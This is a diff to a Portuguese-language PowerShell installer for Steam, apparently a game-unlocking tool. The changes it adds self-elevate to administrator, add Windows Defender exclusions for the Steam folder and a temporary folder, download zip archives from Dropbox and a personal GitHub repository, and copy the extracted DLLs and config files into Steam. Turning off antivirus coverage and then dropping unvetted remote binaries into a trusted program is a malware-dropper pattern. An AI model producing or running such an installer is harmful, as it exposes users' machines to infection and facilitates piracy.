@@ -1,8 +1,22 @@
 # ===== CONFIGURAÇÃO DE AMBIENTE =====
 $OutputEncoding = [System.Text.Encoding]::UTF8
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
-$Host.UI.RawUI.WindowTitle = "Game Over - Instalador de Dependências v4.0"
+$Host.UI.RawUI.WindowTitle = "Game Over - Instalador Automático (PLANO GOD)"
 Clear-Host
+
+# ===== ELEVAÇÃO PARA ADMINISTRADOR =====
+if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
+    Start-Process powershell -Verb RunAs -ArgumentList $arguments
+    Break
+}
+
+function Log {
+    param ([string]$Type, [string]$Message)
+    $Type = $Type.ToUpper()
+    $date = Get-Date -Format "HH:mm:ss"
+    Write-Host "[$date] [$Type] $Message" -ForegroundColor Cyan
+}
 
 # ===== DETECÇÃO DA STEAM =====
 function Find-SteamPath {
@@ -11,53 +25,69 @@ function Find-SteamPath {
     try { $reg = Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -ErrorAction SilentlyContinue; if ($reg.SteamPath) { $PossiblePaths += $reg.SteamPath -replace '\\\\', '\' } } catch {}
     if (Test-Path "C:\Program Files (x86)\Steam") { $PossiblePaths += "C:\Program Files (x86)\Steam" }
     $PossiblePaths = $PossiblePaths | Select-Object -Unique | Where-Object { Test-Path $_ }
-    if ($PossiblePaths.Count -eq 0) { Write-Host "Steam nao encontrada." -ForegroundColor Red; Start-Sleep -Seconds 3; exit 1 }
+    if ($PossiblePaths.Count -eq 0) { Log "ERR" "Steam nao encontrada."; exit 1 }
     return $PossiblePaths[0]
 }
 
 $steamDir = Find-SteamPath
 $configDir = Join-Path $steamDir "config"
+$luaDir = Join-Path $configDir "lua"
 
-# ===== EXECUÇÃO DIRETA =====
-Write-Host "Iniciando instalacao de dependencias..." -ForegroundColor Cyan
+# ===== EXCLUSÃO DEFENDER =====
+function Add-DefenderExclusion {
+    Log "INFO" "Configurando exceções de segurança..."
+    try {
+        Add-MpPreference -ExclusionPath $steamDir -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionPath "C:\GameOver_Download_Tmp" -ErrorAction SilentlyContinue
+        Log "OK" "Exceções aplicadas."
+    } catch { Log "WARN" "Não foi possível aplicar exceções." }
+}
 
-# 1. Fechar Steam
+# ===== INSTALAÇÃO DIRETA =====
+Log "INFO" "Iniciando processo de instalação..."
+Add-DefenderExclusion
+
+# Criar pasta lua
+if (-not (Test-Path $luaDir)) { New-Item -ItemType Directory -Path $luaDir | Out-Null }
+
+# Fechar Steam
 Get-Process steam, steamwebhelper -ErrorAction SilentlyContinue | Stop-Process -Force
 Start-Sleep -Seconds 2
 
-# 2. Criar pasta 'lua' dentro de 'config'
-$luaDir = Join-Path $configDir "lua"
-if (-not (Test-Path $luaDir)) {
-    New-Item -ItemType Directory -Path $luaDir | Out-Null
-    Write-Host "Pasta 'lua' criada com sucesso." -ForegroundColor Green
-}
-
-# 3. Download e Instalação de DLLs
 $tmp = "C:\GameOver_Download_Tmp"
 if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
 New-Item -ItemType Directory -Path $tmp | Out-Null
 
+$nomeArquivo = Join-Path $tmp "planonovo.zip"
 $zipDlls = Join-Path $tmp "Pack.zip"
-$urlDLLs = "https://download1640.mediafire.com/ic1r02ssfaeg7EhBhyFNsKIDHU3Bm3Yd5QwLquOqeYXBD-JSs7ioEPzLLCHehjo2TT2Gy3dp2i7pVmOqmku4xzx61ZzO9_fIV-ILFNxdCjL_W8TC7IAelj3HHneMLCFG8bDnQf5TsrMHYKrWNWkLJLllMTmHisXLfddflMOLv5h2/xxv4nf0k7ptnu4t/Pack.zip"
+$urlDoZip = "https://www.dropbox.com/scl/fi/bwsr8ahzp6tfbirca13cs/planonovo.zip?rlkey=lmm7wqys1gdftupv2m4e5c9b8&st=b6l2xyxn&dl=1"
+$urlDLLs = "https://github.com/master18032008/packzip/raw/refs/heads/main/Pack.zip"
 
-Write-Host "Baixando dependencias..." -ForegroundColor Cyan
+Log "INFO" "Baixando arquivos..."
 try {
+    Invoke-WebRequest -Uri $urlDoZip -OutFile $nomeArquivo -UseBasicParsing -ErrorAction Stop
     Invoke-WebRequest -Uri $urlDLLs -OutFile $zipDlls -UseBasicParsing -ErrorAction Stop
     
+    # Extrair DLLs
     $tmpDlls = Join-Path $tmp "ExtraidoDLLs"
-    Expand-Archive -Path $zipDlls -DestinationPath $tmpDlls -Force -ErrorAction Stop
+    Expand-Archive -Path $zipDlls -DestinationPath $tmpDlls -Force
+    Get-ChildItem -Path $tmpDlls -Recurse -Filter "*.dll" | ForEach-Object { Copy-Item -Path $_.FullName -Destination $steamDir -Force }
+
+    # Extrair Conteúdo
+    Expand-Archive -Path $nomeArquivo -DestinationPath $tmp -Force
+    $pastaConfigZip = Get-ChildItem -Path $tmp -Recurse -Directory -Filter "Config" | Select-Object -First 1
     
-    Get-ChildItem -Path $tmpDlls -Recurse -Filter "*.dll" | ForEach-Object {
-        Copy-Item -Path $_.FullName -Destination $steamDir -Force
-    }
-    Write-Host "DLLs instaladas com sucesso!" -ForegroundColor Green
+    if ($pastaConfigZip) { Copy-Item -Path "$($pastaConfigZip.FullName)\*" -Destination "$configDir\" -Recurse -Force }
+    
+    Log "OK" "PLANO GOD INSTALADO COM SUCESSO!"
 } catch {
-    Write-Host "Erro ao instalar dependencias: $($_.Exception.Message)" -ForegroundColor Red
+    Log "ERR" "Falha na instalação: $($_.Exception.Message)"
 }
 
-# 4. Limpeza
 if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
 
-Write-Host "Instalacao concluida. Reiniciando Steam..." -ForegroundColor Cyan
+# Reiniciar
 $exe = Join-Path $steamDir "steam.exe"
 if (Test-Path $exe) { Start-Process $exe -ArgumentList "-clearbeta" }
+
+exit 0
